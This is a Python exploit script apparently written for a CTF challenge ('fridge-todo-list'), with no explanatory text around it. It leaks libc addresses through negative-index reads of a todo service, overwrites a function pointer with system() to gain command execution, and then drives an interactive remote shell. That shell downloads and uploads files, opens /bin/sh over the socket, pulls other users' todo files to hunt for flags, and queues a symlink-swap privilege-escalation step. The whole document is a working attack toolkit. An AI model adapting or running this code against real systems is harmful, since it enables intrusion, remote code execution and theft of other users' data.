#!/usr/bin/python3
import os.path
import hashlib
import logging
import struct
import socket
import base64
import shlex
import gzip
import time
import cmd
import sys
import re
import os
import io


TARGET_HOST = 'fridge-todo-list.ctfcompetition.com'
# TARGET_HOST = '127.0.0.1'
TARGET_PORT = 1337


logging.basicConfig(format='[%(levelname)-8s]  %(message)s', level=logging.DEBUG)
logger = logging.getLogger('ctf')


## Internal stuff
USERNAME = b'A' * 63
FLAG_PATTERN = re.compile(r'CTF{[^}]+}')
SEGFAULT_MSG = b'Segmentation fault (core dumped)\n'
FILESIZE_LIMIT = 1024 * 1024


RO_BLOCKS = [43852, 43854, 43747, 43897]





logger.info('Connecting to {}:{}'.format(TARGET_HOST, TARGET_PORT))
sock = socket.socket()
sock.connect((TARGET_HOST, TARGET_PORT))




def read_until(check):
    buffer = bytes()
    try:
        while check not in buffer:
            buffer += sock.recv(1)
            if SEGFAULT_MSG in buffer:
                sys.stderr.write('\n[Segmentation fault]\n')
                sys.stderr.write('HEX: {}\n'.format(buffer.hex()))
                sys.stderr.write('RAW: {}\n'.format(buffer))
                exit(1)

    except KeyboardInterrupt:
        sys.stderr.write('\n[Interrupted]\n')
        sys.stderr.write('HEX: {}\n'.format(buffer.hex()))
        sys.stderr.write('RAW: {}\n'.format(buffer))
        exit(1)

    return buffer


def read_entry(n):
    read_until(b'> ')

    send_and_wait(b'2\n'        , b'Which entry would you like to read? ')
    send_and_wait(b'%d\n' % n   , b'Your TODO: ')
    
    data = read_until(b'\n\n')[:-2]
    read_until(b'6) Exit\n')
    
    return data


def read_addr(n):
    return int.from_bytes(read_entry(n), 'little')


def send_data(data):
    buffer = send_data._buffer
    if buffer:
        buffer.write(data)

    sock.send(data)


def __send_new_buffer():
    send_data._buffer = io.BytesIO()

def __send_collect():
    data = send_data._buffer.getvalue()
    send_data._buffer = None
    return data


send_data._buffer = None
send_data.new_buffer = __send_new_buffer
send_data.collect = __send_collect


def send_and_wait(data, check):
    send_data(data)
    return read_until(check)


def write_entry(n, data):
    read_until(b'> ')
    send_and_wait(b'3\n'        , b'In which slot would you like to store the new entry? ')
    send_and_wait(b'%d\n' % n   , b'What\'s your TODO? ')
    send_and_wait(data + b'\n'  , b'6) Exit\n')



logger.info('Logging into the system')
read_until(b'user: ')
send_and_wait(USERNAME + b'\n', b'6) Exit\n')




def hash_blocks(blocks):
    hash = hashlib.md5()
    for n in blocks:
        data = read_entry(-n)
        hash.update(data)

    return hash.digest()



logger.info('Checking binary version')
hash = hash_blocks(RO_BLOCKS)
if hash.hex() != '5892215f184ae8bdf172e2077ab73413':
    logger.critical('Bad binary version')



def concat_aslr(*addrs):
    n = 0
    for (i, addr) in enumerate(addrs):
        n |= addr << (12 * i)
    
    return n



SYSTEM_OFFSET_MAPPING = {
    # CTF server version
    concat_aslr(0x030, 0x0e0, 0x916): 0xb1ca0,

    # Debian libc-2.27.so (local version)
    concat_aslr(0xd90, 0x910, 0x916): 0xa57c0,
}

logger.info('Checking libc version')
open_addr    = read_addr(-4)
strncat_addr = read_addr(-5)
write_addr   = read_addr(-6)

unique = concat_aslr(
    open_addr    & 0xFFF,
    strncat_addr & 0xFFF,
    write_addr   & 0xFFF
)


system_offset = SYSTEM_OFFSET_MAPPING[unique]
system_addr = open_addr - system_offset
if system_addr < 0:
    logger.critical('ALSR did not helped us this time')
    exit(1)


logger.debug('Applying patch')
payload = open_addr.to_bytes(8, 'little') + system_addr.to_bytes(8, 'little')
write_entry(-4, payload)


def execute(cmd):
    read_until(b'> ')
    
    end = b'\nunknown option '
    data = send_and_wait(cmd + b'\n', end)[:-len(end)]
    read_until(b'6) Exit\n')

    return data


def get_file(rname):
    encoded = execute('(gzip < {}) | base64 -w0'.format(rname).encode('utf8'))
    compressed = base64.b64decode(encoded)
    return gzip.decompress(compressed)


def push_file(rname, data):
    if len(data) > FILESIZE_LIMIT:
        logger.warning('The file is too big')
    
    cmdline = '(base64 -d <<__FOR_SURE_EOF) | gunzip > {}\n'.format(rname).encode('utf8')
    compressed = gzip.compress(data)
    data = base64.b64encode(compressed)
    
    send_data.new_buffer()

    read_until(b'> ')
    send_and_wait(b'PS1="## " /bin/sh -i +m\n', b'## ')
    send_and_wait(cmdline, b'> ')

    total = len(data)
    block_size = 10 * 1024
    n_blocks = total // block_size
    if total % block_size != 0:
        n_blocks += 1

    for i in range(n_blocks):
        block = data[:block_size]
        data = data[block_size:]
        send_and_wait(block + b'\n', b'> ')

        progress = ((i + 1) / n_blocks) * 100
        sys.stdout.write('\rUploading: %.1f%%' % progress)
        sys.stdout.flush()

    sys.stdout.write('\n')

    send_and_wait(b'\n', b'> ')
    ret = send_and_wait(b'__FOR_SURE_EOF\n', b'## ')
    if len(ret) > 3:
        logger.warning('Trailing: %s', ret[:-3].decode('utf8'))


    # print('-- DATA SENT ------------------')
    # print(send_data.collect().decode('utf8'))
    # print('-------------------------------')

    end = b'\nunknown option '
    data = send_and_wait(b'exit\n', end)[:-len(end)]
    read_until(b'6) Exit\n')


def get_user_todos(user):
    data = get_file('todos/{}'.format(user))
    todos = (b[0] for b in struct.iter_unpack('48s', data))
    todos = (b[:b.find(b'\x00')] for b in todos)
    todos = filter(lambda b: len(b) > 0, todos)
    todos = (b.decode('utf8') for b in todos)
    return list(todos)


def scan_todos():
    logger.info('Fetching users')
    users = execute(b'ls todos/').split()
    users = [u.decode('latin') for u in users if u != USERNAME]

    for user in users:
        logger.debug('User found: %s', user)
        todos = get_user_todos(user)
        for todo in todos:
            match = FLAG_PATTERN.search(todo)
            if match:
                flag = match.group(0)
                logger.warning('Flag found: %s', flag)

            logger.debug('  - %s', todo)



logger.info('Checking limits')
try:
    as_str = execute(b'ulimit -f').decode('utf8').strip()
    FILESIZE_LIMIT = int(as_str) * 512
except ValueError:
    logger.warning('Could not retrieve file size limit')



class Shell(cmd.Cmd):
    intro = 'Type help or ? to list commandsock.\n'
    prompt = '(ctf) '
    file = None

    def do_debug(self, arg):
        try:
            import ipdb; ipdb.set_trace()
        except Exception:
            import pdb; pdb.set_trace()
    

    def do_shell(self, arg):
        print(execute(arg.encode('utf8')).decode('utf8'))
    

    def do_scan_todos(self, arg):
        scan_todos()


    def do_download(self, arg):
        data = get_file(arg)
        local = osock.path.basename(arg)
        with open(local, 'wb') as fp:
            fp.write(data)

    
    def do_upload(self, arg):
        local, remote = shlex.split(arg)
        with open(local, 'rb') as fp:
            data = fp.read()
        
        push_file(remote, data)
    

    def do_exec(self, arg):
        read_until(b'> ')
        send_data(arg.encode('utf8') + b'\n')
        while True:
            sys.stdout.write(sock.recv(1).decode('utf8'))


    def do_console(self, arg):
        import telnetlib

        read_until(b'> ')
        send_data(b'/bin/sh +m -i\n')
        con = telnetlib.Telnet()
        con.sock = sock
        con.interact()



shell = Shell()
shell.cmdqueue = [
    'upload symlinkswap todos/symlinkswap',
    '!chmod +x todos/symlinkswap',
    '!mkdir -p todos/dev',
    # 'exec cd todos; ./symlinkswap /home/user/holey_beep /secret_cake_recipe'
]

shell.cmdloop()
